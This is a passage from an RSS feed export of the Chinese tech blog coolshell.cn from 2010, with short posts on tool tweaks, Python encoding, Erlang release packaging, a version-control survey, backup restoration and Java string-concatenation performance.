<li>编辑command.xml文件（建议之前备份），替换<strong>所有</strong> <span style="color: #0000ff;">&lt;C319 Type=”6″ Activator=”ZoomIn” /&gt;</span> 为<span style="color: #0000ff;">&lt;C319 Type=”6″ Activator=”<span style="color: #ff0000;">ScrollUp</span>” /&gt;</span><strong>,  所有</strong><span style="color: #0000ff;"> &lt;C320 Type=”6″ Activator=”ZoomOut” /&gt; </span>替换为<strong> <span style="color: #0000ff;"><span style="font-weight: normal;">&lt;C320 Type=”6″ Activator=”<span style="color: #ff0000;">ScrollDown</span>” /&gt;</span></span> </strong>用Notepad或者记事本可以实现，应该是10个左右。</li>
<li>重启电脑（貌似这一步不能省）</li>
</ol>
<p>图例：修改前</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/02/before.png"><img alt="image placeholder" ></a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/02/before.png"></a>图例：修改后</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/02/after.png"><img alt="image placeholder" ></a></p>
<p>这样你就可以用Zoom来替代鼠标滚轮了。</p>
 ]]></content>
<pubDate>2010-02-07T10:08:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/2097.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 分享：我的Reader订阅 ]]></title>
<link>https://coolshell.cn/articles/2105.html</link>
<content><![CDATA[ 
<p>应网友workout和其他热心读者的要求，我罗列一些自己觉得值得推荐的feed。用纯文字罗列如下，想找到以下的话可以通过Google。希望大家在此互相分享。</p>
<p>适合读者：广谱技术爱好者，国外互联网信息爱好者，用户行为和设计爱好者， 语言爱好者，阅读狂。</p>
<p><strong>技术类</strong></p>
<ul>
<li>Coding horror</li>
<li>Joel on software</li>
<li>unified Python planet</li>
</ul>
<p><strong>业界信息</strong></p>
<ul>
<li>谷歌黑板报</li>
<li>Search Blog: Bing</li>
<li>Search</li>
<li>百度爱好者</li>
<li>silicon valley watcher</li>
<li>Google Blogscoped</li>
<li>Google Code Blog</li>
<li>月光博客</li>
<li>apple4us</li>
<li>古奥</li>
<li>望月的博客</li>
<li>Google Operating System</li>
</ul>
<p><strong>杰出个人博客</strong></p>
<ul>
<li>Paul Graham Essays</li>
<li>Pure Pleasure – lixiaolai.com</li>
<li>The noisy channel</li>
<li>李开复新浪博客</li>
<li>韩寒博客</li>
<li>the trump blog</li>
<li>Matt Cutts</li>
<li>Linus blog</li>
<li>Paul Buchheit (Gmail创始人)</li>
<li>Peter Norvig (人工智能大儒， Google 研究总监)</li>
<li>too (Google 创始人博客）</li>
<li>Alon Halevy’s Blog</li>
<li>Daniel Lemire’s blog</li>
<li>Clay Shirky</li>
<li>Earning My Turns</li>
<li>How to change the world</li>
</ul>
<p><span id="more-2105"></span></p>
<p><strong>英语学习</strong></p>
<ul>
<li>London Review of Books</li>
<li>New York Review of Books</li>
</ul>
<p><strong>研究或学习类</strong></p>
<ul>
<li>MIT OpenCourseWare: CS and EE</li>
<li>Recent Google Publication</li>
<li>Language Log</li>
</ul>
<p><strong>用户体验和设计类</strong></p>
<ul>
<li>Mozilla Labs</li>
<li>Taobao.com UED team blog</li>
<li>uxday</li>
<li>Alipay UED</li>
<li>Aza’s thoughts</li>
<li>A List Apart</li>
</ul>
<p><strong>娱乐消遣类</strong></p>
<ul>
<li>the big picture</li>
<li>煎蛋</li>
<li>有意思吧</li>
<li>Lolcats ‘n’ funny pictures</li>
<li>Drawn! The illustration and cartooning blog</li>
<li>科学松鼠会</li>
</ul>
<p>更多经典种子，亲爱的读者，等你添加。分享是快乐的。</p>
 ]]></content>
<pubDate>2010-02-08T21:47:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/2105.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Python处理encoding的小技巧 ]]></title>
<link>https://coolshell.cn/articles/2109.html</link>
<content><![CDATA[ 
<p>用Python写过处理文本经常会遇到需要decoding或者encoding, 尤其是处理中文的时候。</p>
<p>encoding的问题处理起来是个脏活儿，报错不太容易看懂，网上相关资料不太好查。有同感？请继续读下去。</p>
<p>常规做法是读取文件的时候立刻decode, 所有的处理工作都用unicode，写会文件的时候encode. 但是等到读取的时候在处理的代码读/写起来都很别扭，感觉像穿上鞋以后袜子滑下来了…<span style="color: #ff0000;">Python 3.1.1</span><span style="color: #ff0000;">以上</span>的版本解决了该问题。在Python 3.1.1中，打开文件可以加入encoding的参数：</p>
<pre>file = open(filename, <span style="color: #0000ff;">encoding='xxx'</span>)</pre>
<p>啊，这样看起来终于舒坦了。 不同写如下的code了</p>
<pre>file = open(filename)
for line in file:
    <span style="color: #0000ff;">decoded_line = line.decode('xxx')</span>
    do something else
提倡使用<span style="color: #0000ff;">utf8</span></pre>
<p></p>
 ]]></content>
<pubDate>2010-02-08T22:06:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/2109.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ erlang打包独立环境 ]]></title>
<link>https://coolshell.cn/articles/2111.html</link>
<content><![CDATA[ 
<p>最近公司代码需要在非erlang的系统上执行，需要能在独立的环境里运行erlang。研究甚久，于是写下这篇博文。国内用erlang的朋友不多，希望这篇blog能对有需要的朋友起到参考作用。</p>
<blockquote><p>Application-Vsn/ebin<br>
/include<br>
/priv<br>
/src<br>
/Application-Vsn.rel</p></blockquote>
<p>以上是代码的目录表.</p>
<blockquote><p>{release, {“nextim”, “2.0”},<br>
{erts, “5.7.5”},<br>
[{kernel, “2.12.3”},<br>
{stdlib, “1.15.3”},<br>
{sasl, “2.1.5.3”}]<br>
}.</p></blockquote>
<p>以上是Application-Vsn.rel的内容,[]中是代码本身需要的lib。</p>
<p><span id="more-2111"></span></p>
<p>1.执行erl -pa ./ebin . 这一步会生成nextim-2.boot文件</p>
<blockquote><p>1&gt; systools:make_script(nextim-2″, [local]).<br>
ok</p></blockquote>
<p>2.erl -boot nextim-2 . 这一步会生成nextim-2.tar.gz</p>
<blockquote><p>systools:make_tar(“nextim-2”).</p></blockquote>
<p>3.现在建议把tar.gz文件放到独立的路径里 这样不会影响Application-Vsn文件夹 ，然后解压 并进入目录， 复制erlang系统目录里的 erts-5.7.5 到当前目录</p>
<p>4.建立bin文件夹 复制  <span style="color: #ff0000;"><code>erts-5.7.5/bin/start</code> </span>到 <code><span style="color: #ff0000;">bin/</span> 编辑 <span style="color: #ff0000;">bin/start</span> 改 <span style="color: #ff9900;">ROOTDIR</span>为当前目录的路径</code></p>
<p>5.复制<span style="color: #ff0000;"><code>erts-5.7.5/bin/run_erl</code></span> <code>和 </code><span style="color: #ff0000;"><code>erts-5.7.2/bin/erl</code></span><code> 到 <span style="color: #ff0000;">bin</span> 并且如同上一步一样修改ROOTDIR.</code></p>
<p>6.复制 <span style="color: #ff0000;"><code>$ERLDIR/bin/start_sasl.boot</code></span> 到  <span style="color: #ff0000;"><code>bin/start.boot</code></span>.</p>
<p>7. <span style="color: #ff9900;"><code>echo</code> <code>"5.7.5</code> <code>2.0"</code> <code>&gt;</code> <code>releases/start_erl.data</code>.</span></p>
<p>6.执行bin文件里的erl</p>
<blockquote><p>release_handler:create_RELEASES(“$ROOTDIR”, “$ROOTDIR/releases/”, “$ROOTDIR/releases/nextim-2.rel”, []).</p></blockquote>
<p>7.再把自己的项目文件复制到lib中  然后启动时 -pa参数是 lib文件夹. 完成这一步，就能独立出erlang环境了。</p>
<p>以上内容 参考自</p>
<p>http://spawnlink.com/articles/an-introduction-to-releases-with-erlybank/</p>
<p>http://streamhacker.com/2009/07/02/how-to-create-an-erlang-first-target-system/</p>
 ]]></content>
<pubDate>2010-03-04T02:55:13+08:00</pubDate>
<guid>https://coolshell.cn/articles/2111.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Titanium – 桌面和移动应用开发平台 ]]></title>
<link>https://coolshell.cn/articles/2117.html</link>
<content><![CDATA[ 
<p><em><a href="http://www.readwriteweb.com/archives/titanium_10_launches_build_native_apps_for_desktop_mobile_ipad.php">文章来源 www.readwriteweb.com</a></em><em><br>
</em></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/03/PROD_tit_mobile.png"><img alt="image placeholder" ></a></p>
<p>2010年3月8日，Appcelerator 公司发布了 Titanium 的 1.0 版本。 Titanium 是一个桌面和移动应用程序开发平台，基于此平台，开发人员可以使用标准的 WEB 技术如 HTML，JavaScript，和 CSS 来开发桌面和移动应用程序。</p>
<p>和其他开发平台所宣传的开发移动应用无需理解本机代码不同， Titanium 允许开发人员使用他们熟悉的编程技术来开发本机（native）移动应用，同时效果和功能与那些使用平台特定语言编写的应用相同，如可以操纵内置相机、播放视频流等等。 Titanium 的产品代码在近几个月内得到了优化，在性能方面得到了多处改进，加载时间由原来的10-20秒下降为3秒，页面切换非常迅速，处理速度提高了5倍。同时还增加了一些新的功能，如超过100个本机界面控件，2D 和 3D 动画及媒体处理机能。有了这些方面的增强，开发人员可以在 Titanium 支持的平台上开发品牌化应用， 休闲游戏， 以及增强现实应用。</p>
<p>当被问到 Titanium 与其他开发平台的不同之处在哪里时，公司的营销副总裁 Scott Schwarzhoff 解释道：“很多我们的竞争者经仅仅是将 WEB 应用曲解为本机应用提供给客户，而没有提供真正的本机应用解决方案”。提供本机界面（超过100个本机API）的只有我们一家公司，同时我们还提供推通知服务，本机地图，Facebook连接，应用数据分析，增强现实应用，将来还会有更多特性。</p>
<p>自2009年6月以来，Titanium 开发平台吸引了超过27000名开发人员对公司所谓“本机优势”概念的兴趣（<em><a href="http://www.appcelerator.com/products/native-iphone-android-development/">阅读详情</a></em>）。其中包括对本机控件的支持，基于位置的服务，社交共享，HTML 5，在线和设备内置数据库，集成数据分析，丰富的多媒体等等。</p>
<p>Appcelerator 承诺在3月份的第三周支持苹果的新平板设备，包括几周后即将发布的 iPad。对黑莓的支持将于五月或六月间发布。Titanium 的社区版本完全免费，专业版本不免费，但是提供技术支持，数据分析以及对新版本的预览。</p>
<p>Titanium 支持的平台包括： PC， Mac，Linux，最新版本则支持 iPhone 和 Android，Appcelerator 公司即将发布对黑莓和苹果 iPad 的支持。</p>
 ]]></content>
<pubDate>2010-03-10T18:47:43+08:00</pubDate>
<guid>https://coolshell.cn/articles/2117.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Martin Fowler 在 ThoughtWorks 内部关于版本控制工具的调查 ]]></title>
<link>https://coolshell.cn/articles/2135.html</link>
<content><![CDATA[ 
<p><a href="http://martinfowler.com/bliki/VcsSurvey.html"><em>文章来源 martinfowler.com</em></a></p>
<p>从2010年2月23日至3月3日，Martin Fowler 在 ThoughtWorks 内部通过开发人员邮件列表进行了一个关于版本控制工具的小调查，共收到99个回复。下面是调查选项定义和调查结果：</p>
<ul>
<li>非常好 （如果不是最好也非常接近了）</li>
<li>还行 （不是最好，但是我还是愿意使用）</li>
<li>问题多多 （我可能会因此强烈建议我的团队使用其他同类工具）</li>
<li>危险 （非常糟糕的工具，我认为 ThoughtWorks 不应该使用它）</li>
<li>不知道 （我还没有使用过此工具）</li>
<li>回复数 （对此工具的回复总数，包括“不知道”选项）</li>
<li>好评率 （(“非常好”+“还行”)/回复数）</li>
</ul>
<table>
<tbody>
<tr>
<th>名称</th>
<th>非常好</th>
<th>还行</th>
<th>问题多多</th>
<th>危险</th>
<th>不知道</th>
<th>回复数</th>
<th>好评率</th>
</tr>
<tr>
<td><strong>Subversion</strong></td>
<td>20</td>
<td>72</td>
<td>6</td>
<td>1</td>
<td>0</td>
<td>99</td>
<td>93%</td>
</tr>
<tr>
<td><strong>git</strong></td>
<td>65</td>
<td>19</td>
<td>1</td>
<td>0</td>
<td>14</td>
<td>85</td>
<td>99%</td>
</tr>
<tr>
<td><strong>Mercurial</strong></td>
<td>33</td>
<td>27</td>
<td>2</td>
<td>0</td>
<td>36</td>
<td>62</td>
<td>97%</td>
</tr>
<tr>
<td><strong>ClearCase</strong></td>
<td>0</td>
<td>3</td>
<td>14</td>
<td>41</td>
<td>41</td>
<td>58</td>
<td>5%</td>
</tr>
<tr>
<td><strong>TFS</strong></td>
<td>0</td>
<td>0</td>
<td>32</td>
<td>22</td>
<td>44</td>
<td>54</td>
<td>0%</td>
</tr>
<tr>
<td><strong>CVS</strong></td>
<td>0</td>
<td>14</td>
<td>59</td>
<td>11</td>
<td>15</td>
<td>84</td>
<td>17%</td>
</tr>
<tr>
<td><strong>Bazaar</strong></td>
<td>1</td>
<td>13</td>
<td>3</td>
<td>0</td>
<td>80</td>
<td>17</td>
<td>82%</td>
</tr>
<tr>
<td><strong>Perforce</strong></td>
<td>1</td>
<td>26</td>
<td>16</td>
<td>1</td>
<td>54</td>
<td>44</td>
<td>61%</td>
</tr>
<tr>
<td><strong>VSS</strong></td>
<td>1</td>
<td>1</td>
<td>11</td>
<td>64</td>
<td>22</td>
<td>77</td>
<td>3%</td>
</tr>
</tbody>
</table>
<p>Martin Fowler 补充道：</p>
<ul>
<li>Subversion，git，和 Mercurial 都得到了较高的好评率，git 得分最高。</li>
<li>大部分人认为 VSS 很危险，不过也有一两个人认为它还不错。</li>
<li>大家都不太喜欢 TFS 和 ClearCase，并认为 ClearCase 更为危险。</li>
<li>我们不用太拘泥于具体数据，特别是对于那些不好的工具的差评都无太大区别，而对于那些优秀的工具的好评却很有一些不同。</li>
</ul>
<p>Martin Fowler 反复强调这只是一个公司内部的调查，并无误导市场的意思，大家如果感兴趣的话可以点击 <em><a href="http://martinfowler.com/bliki/VcsSurvey.html"><em>文章来源</em></a></em> 阅读原文，以及另一篇关于版本控制的文章 <em><a href="http://martinfowler.com/bliki/VersionControlTools.html">VersionControlTools</a></em>。</p>
 ]]></content>
<pubDate>2010-03-13T06:31:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/2135.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 中国仍然是一个很穷的国家 ]]></title>
<link>https://coolshell.cn/articles/2179.html</link>
<content><![CDATA[ 
<p>Google最近发布了一个全世界可以开放查询的数据平台，其中包含了多种宏观数据，并且有很方便的作图方式。</p>
<p><a href="https://www.google.com/publicdata/directory">http://www.google.com/publicdata/directory</a></p>
<p>其中有一项是<a href="https://www.google.com/publicdata/explore?ds=ltjib1m1uf3pf_&amp;ctype=l&amp;met_y=sizegdp_t2&amp;hl=en_US&amp;dl=en_US">世界各国人均GDP</a></p>
<p>虽然最近一些中国城市房价已经超越我们的想象力，但是从<a href="https://www.google.com/publicdata/explore?ds=ltjib1m1uf3pf_&amp;ctype=l&amp;met_y=sizegdp_t2&amp;hl=en_US&amp;dl=en_US#ctype=l&amp;met_y=sizegdp_t2&amp;scale_y=lin&amp;ind_y=false&amp;rdim=country&amp;idim=country:CHN:IND:DEU:GBR:USA:ZAF:ITA:AUS:CAN:RUS:JPN&amp;hl=en_US&amp;dl=en_US">这张图</a>里还是可以看到，我们仍是一个人均非常穷的国家。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/03/we-are-still-poor.jpg"><img alt="image placeholder" ></a></p>
 ]]></content>
<pubDate>2010-03-14T20:51:49+08:00</pubDate>
<guid>https://coolshell.cn/articles/2179.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ BT工作原理演示 ]]></title>
<link>https://coolshell.cn/articles/2184.html</link>
<content><![CDATA[ 
<div class="mceTemp">下面这个网站使用Javascript编写了一个BT工作原理演示动画程序。当然，你可能需要使用Chrome浏览器打开，因为他真的很耗CPU。在我的双核（2GHz）T60电脑上用Chrome打开CPU一下就被耗了50%左右。</div>
<div class="mceTemp" style="text-align: center;"><a href="http://mg8.org/processing/bt.html">http://mg8.org/processing/bt.html</a></div>
<div class="mceTemp" style="text-align: left;">下面是我截的一个图，每个圆代表一个结点，其会通过其它结点下载需要的文件段。结点中间的那个Bar有点类似于eDonkey中的下载进度条。至于为什么要用像彩虹一样的颜色，主要是为了让你看到不同的段是从不同的结点下载的。</div>
<div class="mceTemp" style="text-align: left;">你可以按热键S来加入一个下载完了的结点，用P来加入一下空结点，按R来删除一个结点（有点慢，要等10秒左右吧）。</div>
<figure id="attachment_2185" aria-describedby="caption-attachment-2185" style="width: 553px" class="wp-caption alignnone"><a href="https://coolshell.cn/wp-content/uploads/2010/03/bt_js_demo.jpg"><img alt="image placeholder" ></a><figcaption id="caption-attachment-2185" class="wp-caption-text">BT工作原理演示动画</figcaption></figure>
<p>关于其它Javascript的一些小玩意，你可以看看<a title="哥是玩程序的" href="https://coolshell.cn/articles/1932.html" target="_blank">这篇文章</a>。</p>
 ]]></content>
<pubDate>2010-03-16T15:09:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/2184.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 别只谈系统备份，谈谈怎样恢复系统吧！ ]]></title>
<link>https://coolshell.cn/articles/2155.html</link>
<content><![CDATA[ 
<p><em><a href="http://www.joelonsoftware.com/items/2009/12/14.html">文章来源 JoelOnSoftware.com</a></em></p>
<p><em>很久以前就看到这篇文章，它给了我很深刻的印象，搜索了一下 JoelOnSoftware 的中文 Wiki，似乎也没有此文的中文版，那就让酷壳来完成吧。</em></p>
<ul>
<li>你备份你的系统了吗？</li>
<li>你备份服务器了吗？</li>
<li>你的备份是否存放在另一台机器中？</li>
<li>你是否有异地备份？</li>
</ul>
<p>以上都是非常好的问题，也都是很好的备份习惯。</p>
<p>不过，让我们别再只谈备份了，因为仅仅备份是远远不够的。资深的系统管理员们都会告诉你他们有完美的备份计划，但是问题往往发生在当你需要恢复系统的时候：</p>
<ul>
<li>备份文件被密钥加密，而遗失或损坏的恰恰就是存放密钥的那台机器。</li>
<li>存放着大量配置信息的 IIS 元数据库恰好没有备份。</li>
<li>备份文件一直被拷贝到一个限量2GB的FAT分区，多出来的数据被默默地抛弃掉了。</li>
<li>你的备份都在一个LTO磁带上，磁带已经和数据中心一起遗失或损坏了（911？）。</li>
<li>即便你有了备份，仍有可能遇到许许多多的意外情况。</li>
</ul>
<p>所以，保证基本的系统安全不仅仅取决于你做了备份，还在于你是否能够成功恢复备份。如果你在运营一个 WEB 服务，你需要向我展示你能够在合理的时间内，在一台新的服务器或者是和原来的数据没有任何关系的服务器上，使用近期备份的数据还原出整个网站。</p>
<p>让我们不要再问人们是否做了系统备份，而是问他们是否能够恢复系统。</p>
 ]]></content>
<pubDate>2010-03-25T08:16:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/2155.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ DEMO Spring 2010 获奖产品 ]]></title>
<link>https://coolshell.cn/articles/2191.html</link>
<content><![CDATA[ 
<p><a href="https://mashable.com/2010/03/23/demo-god-awards/?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+Mashable+(Mashable)&amp;utm_content=Google+Reader"><em>文章来<em>源</em> mashable.com</em></a></p>
<p>在刚刚结束的 <a href="http://demo.com/" target="_blank">DEMO Spring 2010</a> 中，执行制作人 Matt Marshall 宣布了获得 DEMO 大奖的各类 IT 产品，以及由大众评选出的最佳产品，作为奖品， DEMO 将为该产品提供价值100万美元的 <a href="www.idg.com">IDG</a> 广告宣传。以下是各类奖项的归属：</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/03/Zosh.jpg"><img alt="image placeholder" ></a> <strong>移动产品 <a href="http://zosh.com/" target="_blank">Zosh</a></strong></p>
<p>Zosh 是一个 iPhone 应用。有了Zosh，你无需使用扫描仪或者传真机即可实现对文档签名，Zosh支持的文档格式有：PDF，Office，以及图像文档。点此处查看 <em><a href="https://mashable.com/2010/03/22/zosh/">产品详情</a></em>。</p>
<p>具体操作方法：</p>
<p>1. 打开邮件中的附件文档，将其发送至Zosh（本地）。</p>
<p>2. 在Zosh中打开该文档，使用手写输入签名。</p>
<p>3. 将签名作为一个“图层”合并到文档中。</p>
<p><strong>社交和媒体产品 <a href="http://everloop.com/" target="_blank">Everloop</a></strong></p>
<p>Everloop 是一个网络社交应用，目标用户是8到13岁的儿童。其现在是一个 White Label 产品（由一个公司开发，但由其他公司进行再包装和市场营销的产品），很快将会独立运营。</p>
<p><span id="more-2191"></span></p>
<p><strong>基于云计算的产品 <a href="http://gwabbit.com/" target="_blank">Gwabbit</a></strong></p>
<p>Gwabbit 已经两次获得 DEMO God 奖项。它的新产品 Gwabbit Cloud Sync 帮助你从 Outlook 和 Blackberry 邮件中提取发件人信息，然后通过 Gwabbit 服务保存和同步。</p>
<p><strong>消费电子产品 <a href="http://phonehalo.com/" target="_blank">Phone Halo</a></strong></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2010/03/Phone_Halo.jpg"><img alt="image placeholder" ></a>Phone Halo 通过电子标签来管理你的手机、钥匙和钱包等贵重物品，在你有可能遗失它们的时候发出警报，从而大大降低遗失的概率。 点此处查看 <em><a href="https://mashable.com/2010/03/23/phone-halo/">产品介绍</a></em>。</p>
<p>Phone Halo 的工作方式大致如下：</p>
<p>1. 在你的手机、钥匙和钱包等贵重物品上贴上有感应装置的电子标签。</p>
<p>2. 在你的手机上安装 Phone Halo 应用程序。</p>
<p>3. 当你忘记携带其中任何一项物品时，也就是你的手机无法感应到其他物品时，手机将会发出报警。如果你没有听到报警声，手机会发送电子邮件给你的亲朋好友，让他们来提醒你忘记了东西。</p>
<p>（根据 Phone Halo 的预测或曰期望，在 2010 年的美国，将有五分之一的人遗失他们的手机，十分之一的人遗失他们的钱包，四分之一的人遗失他们的钥匙，看来该产品很有市场前景）</p>
<p><strong>企业级应用 <a href="http://blueskieshms.com/" target="_blank">BlueSkies Hospitality</a> </strong></p>
<p>BlueSkies Hospitality Restaurant 2.0 是一个餐饮行业解决方案，主要和 OpenTable 争夺市场。</p>
<p><strong>概念产品 <a href="http://uppymedia.com/" target="_blank">UppyMedia TAGtheLOOK</a></strong></p>
<p>TAGtheLOOK 是一个 Facebook 应用，它可以让你在自己或者朋友的时装照片上贴上标签，并且与其他人分享这些标签来展示你的时尚品味。这个应用能给网上时尚商店带来潜在的商机。</p>
<p><strong>大众评选产品 <a href="http://exaudios.com/" target="_blank">eXaudios MagInify Call Center</a></strong></p>
<p><a href="../wp-content/uploads/2010/03/MagInify11.jpg"><img alt="image placeholder" ></a>MagInify 是这样一个工具，它能够解码客户讲话的声音和音调，以判断客户情绪的好坏，从而帮助呼叫中心和客服人员分析统计服务质量，发现不足。</p>
 ]]></content>
<pubDate>2010-03-28T07:44:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/2191.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ JAVA的字符串拼接与性能 ]]></title>
<link>https://coolshell.cn/articles/2235.html</link>
<content><![CDATA[ 
<p><strong>概述：</strong>本文主要研究的是JAVA的字符串拼接的性能，原文中的测试代码在功能上并不等价，导致concat的测试意义不大。不过原作者在评论栏给了新的concat结果，如果有兴趣的同学建议自己修改代码测试。</p>
<p>原文出处:<a href="http://www.venishjoe.net/2009/11/java-string-concatenation-and.html">http://www.venishjoe.net/2009/11/java-string-concatenation-and.html</a></p>
<p>在JAVA中拼接两个字符串的最简便的方式就是使用操作符”+”了。如果你用”+”来连接固定长度的字符串，可能性能上会稍受影响，但是如果你是在循环中来”+”多个串的话，性能将指数倍的下降。假设有一个字符串，我们将对这个字符串做大量循环拼接操作，使用”+”的话将得到最低的性能。但是究竟这个性能有多差？如果我们同时也把StringBuffer,StringBuilder或String.concat()放入性能测试中，结果又会如何呢？本文将会就这些问题给出一个答案！<br>
<span id="more-2235"></span></p>
<p>我们将使用<a href="http://perf4j.codehaus.org/index.html">Per4j</a>来计算性能，因为这个工具可以给我们一个完整的性能指标集合，比如最小，最大耗时，统计时间段的标准偏差等。在测试代码中，为了得到一个准确的标准偏差值，我们将执行20个拼接”*”50,000次的测试。下面是我们将使用到的拼接字符串的方法：</p>
<ul>
<li>Concatenation Operator (+)</li>
<li>String concat method – concat(String str)</li>
<li>StringBuffer append method – append(String str)</li>
<li>StringBuilder append method – append(String str)</li>
</ul>
<p>最后，我们将看看字节码，来研究这些方法到底是如何执行的。现在，让我们先开始来创建我扪的类。注意为了计算每个循环的性能，代码中的每段测试代码都需要用Per4J库进行封装。首先我们先定义迭代次数<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">private static  final int  OUTER_ITERATION=20;
private static final int INNER_ITERATION=50000;
</pre>
<p>接下来，我们将使用上述4个方法来实现我们的测试代码。<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">  	String addTestStr = "";
  	String concatTestStr = "";
  	StringBuffer concatTestSb = null;
  	StringBuilder concatTestSbu = null;
  	 
  	for (int outerIndex=0;outerIndex&lt;=OUTER_ITERATION;outerIndex++) {
  	    StopWatch stopWatch = new LoggingStopWatch("StringAddConcat");
  	    addTestStr = "";
  	    for (int innerIndex=0;innerIndex&lt;=INNER_ITERATION;innerIndex++)
  	    addTestStr += "*";
  	    stopWatch.stop();
  	}       
  	 
  	for (int outerIndex=0;outerIndex&lt;=OUTER_ITERATION;outerIndex++) {
  	    StopWatch stopWatch = new LoggingStopWatch("StringConcat");
  	    concatTestStr = "";
  	    for (int innerIndex=0;innerIndex&lt;=INNER_ITERATION;innerIndex++)
  	    concatTestStr.concat("*");
  	    stopWatch.stop();
  	}
  	 
  	for (int outerIndex=0;outerIndex&lt;=OUTER_ITERATION;outerIndex++) {
  	    StopWatch stopWatch = new LoggingStopWatch("StringBufferConcat");
  	    concatTestSb = new StringBuffer();
  	    for (int innerIndex=0;innerIndex&lt;=INNER_ITERATION;innerIndex++)
  	    concatTestSb.append("*");
  	    stopWatch.stop();
  	}
  	 
  	for (int outerIndex=0;outerIndex&lt;=OUTER_ITERATION;outerIndex++) {
  	    StopWatch stopWatch = new LoggingStopWatch("StringBuilderConcat");
  	    concatTestSbu = new StringBuilder();
  	    for (int innerIndex=0;innerIndex&lt;=INNER_ITERATION;innerIndex++)
  	    concatTestSbu.append("*");
  	    stopWatch.stop();
  	}
</pre>
<p>接下来通过运行程序来生成性能指标。我的运行环境是64位的Windown7操作系统，32位的JVM(7-ea) 带4GB内存，双核Quad 2.00GHz的CPU的机器.</p>
<p>经过20次迭代后，我们得到如下的数据：<br>
<img alt="image placeholder" ></p>
<p>结果非常完美如我们想象的那样。唯一比较有趣的事情是为什么String.concat也很不错，我们都知道，String是一个常类（初始化后就不会改变的类），那么为什么concat的性能会更好一些呢。(<strong>译者注</strong>：其实原文作者的测试代码有问题，对于concat()方法的测试代码应该写成concatTestStr=concatTestStr.concat(“*”)才对。)为了回答这个问题，我们应该看看concat反编译出来的字节码。在本文的下载包里面包含了所有的字节码，但是现在我们先看一下concat的这个代码片段：<br>
</p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">    46:  new #6; //class java/lang/StringBuilder
    49:  dup
    50:  invokespecial   #7; //Method java/lang/StringBuilder."&lt;init&gt;":()V
    53:  aload_1
    54:  invokevirtual   #8; //Method java/lang/StringBuilder.append:
             (Ljava/lang/String;)Ljava/lang/StringBuilder;
    57:  ldc #9; //String *
    59:  invokevirtual   #8; //Method java/lang/StringBuilder.append:
             (Ljava/lang/String;)Ljava/lang/StringBuilder;
    62:  invokevirtual   #10; //Method java/lang/StringBuilder.toString:()
             Ljava/lang/String;
    65:  astore_1
    66:  iinc    7, 1
    69:  goto    38
</pre>
<p>这段代码是String.concat()的字节码，从这段代码中，我们可以清楚的看到，concat()方法使用了StringBuilder，concat()的性能应该和StringBuilder的一样好，但是由于额外的创建StringBuilder和做.append(str).append(str).toString()的操作，使得concate的性能会受到一些影响，所以StringBuilder和String Cancate的时间是1.8和3.3。</p>
<p>因此，即时在做最简单的拼接时，如果我们不想创建StringBuffer或StringBuilder实例使，我们也因该使用concat。但是对于大量的字符串拼接操作，我们就不应该使用concat(<strong>译者注：</strong>因为测试代码功能上并不完全等价，更换后的测试代码concat的平均处理时间是1650.9毫秒。这个结果在原文的评论里面。)，因为concat会降低你程序的性能，消耗你的cpu。因此，在不考虑线程安全和同步的情况下，为了获得最高的性能，我们应尽量使用StringBuilder</p>
<p>本文的源代码，编译目标文件和字节码可以通过下面的这个链接获得：</p>
<p>下载源代码，类和字节码：<a herf="http://www.box.net/shared/hzl48ma8ne">String_Concatenation _Performance.zip</a></p>
 ]]></content>
<pubDate>2010-03-28T09:42:14+08:00</pubDate>
<guid>https://coolshell.cn/articles/2235.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “21天教你学会C++” ]]></title>
<link>https://coolshell.cn/articles/2250.html</link>
<content><![CDATA[ 
<p>下面是一个《Teach Yourself  C++ in 21 Days》的流程图，请各位程序员同仁认真领会。如果有必要，你可以查看这个图书以作参照：<a href="http://www.china-pub.com/27043" target="_blank">http://www.china-pub.com/27043</a></p>
<p style="text-align: center;"><a href="https://coolshell.cn/wp-content/uploads/2010/03/Teach_Youself_CPP_21days.jpg"><img alt="image placeholder" ></a></p>
<p>看完上面这个图片，我在想，我学习C++有12年了，好像C++也没有学得特别懂，看到STL和泛型，还是很头大。不过，我应该去考虑研究量子物理和生物化学，这样，我才能重返98年杀掉还在大学的我，然后达到21天搞定C++的目标。另外，得要特别提醒刚刚开始学习C++的朋友，第21天的时候，小心被人杀害。呵呵。</p>
<p>当然，上面只是一个恶搞此类图片，学习一门技术，需要你很长的时间，正如图片中的第三图和第四图所示，你需要用十年的时间去不断在尝试，并在错误中总结经验教训，以及在项目开发中通过与别人相互沟通互相学习来历练自己。你才能算得上是真正学会。</p>
